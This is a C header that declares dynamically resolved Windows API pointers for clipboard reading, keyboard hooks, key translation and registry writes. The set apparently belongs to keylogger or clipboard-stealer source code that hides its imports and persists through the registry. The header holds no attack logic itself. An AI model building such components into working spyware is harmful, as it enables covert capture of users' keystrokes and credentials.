#pragma once

#include <Windows.h>

// Kernel32.dll
typedef LPVOID (WINAPI *GLOBAL_LOCK)(HGLOBAL hMem);
typedef BOOL (WINAPI *GLOBAL_UNLOCK)(HGLOBAL hMem);
typedef BOOL (WINAPI *READ_FILE)(
	HANDLE hFile, LPVOID lpBuffer, DWORD nNumberOfBytesToRead,
	LPDWORD lpNumberOfBytesRead, LPOVERLAPPED lpOverlapped);

extern GLOBAL_LOCK LpGlobalLock;
extern GLOBAL_UNLOCK LpGlobalUnlock;
extern READ_FILE LpReadFile;

// User32.dll
typedef BOOL (WINAPI *OPEN_CLIPBOARD)(HWND hWndNewOwner);
typedef HANDLE (WINAPI *GET_CLIPBOARD_DATA)(UINT uFormat);
typedef BOOL (WINAPI *CLOSE_CLIPBOARD)(VOID);
typedef LRESULT (WINAPI *CALL_NEXT_HOOK_EX)(
	HHOOK hhk, int nCode, WPARAM wParam, LPARAM lParam);
typedef HHOOK (WINAPI *SET_WINDOWS_HOOK_EX)(
	int idHook, HOOKPROC lpfn, HINSTANCE hmod, DWORD dwThreadId);
typedef SHORT (WINAPI *GET_KEY_STATE)(int nVirtKey);
typedef int (WINAPI *TO_UNICODE)(
	UINT wVirtKey,  UINT wScanCode, CONST BYTE *lpKeyState, LPWSTR pwszBuff,
	int cchBuff, UINT wFlags);
typedef BOOL (WINAPI *GET_MESSAGE)(
	LPMSG lpMsg, HWND hWnd, UINT wMsgFilterMin, UINT wMsgFilterMax);

extern OPEN_CLIPBOARD LpOpenClipboard;
extern GET_CLIPBOARD_DATA LpGetClipboardData;
extern CLOSE_CLIPBOARD LpCloseClipboard;
extern CALL_NEXT_HOOK_EX LpCallNextHookEx;
extern SET_WINDOWS_HOOK_EX LpSetWindowsHookEx;
extern GET_KEY_STATE LpGetKeyState;
extern TO_UNICODE LpToUnicode;
extern GET_MESSAGE LpGetMessage;

// Advapi32.dll
typedef LSTATUS (WINAPI *REG_CREATE_KEY_EX)(
	HKEY hKey, LPCWSTR lpSubKey, DWORD Reserved, LPWSTR lpClass,
	DWORD dwOptions, REGSAM samDesired,
	LPSECURITY_ATTRIBUTES lpSecurityAttributes, PHKEY phkResult,
	LPDWORD lpdwDisposition);
typedef LSTATUS (WINAPI *REG_SET_VALUE_EX)(
	HKEY hKey, LPCWSTR lpValueName, DWORD Reserved, DWORD dwType,
	CONST BYTE* lpData, DWORD cbData);
typedef LSTATUS (WINAPI *REG_CLOSE_KEY)(HKEY hKey);

extern REG_CREATE_KEY_EX LpRegCreateKeyEx;
extern REG_SET_VALUE_EX LpRegSetValueEx;
extern REG_CLOSE_KEY LpRegCloseKey;

/*
 * init_win32_libraries - Initializes all dynamically resolved Windows API
 * methods.
 *
 * Returns zero if successful. On error, returns a non-zero error code.
 */
DWORD init_win32_libraries(VOID);
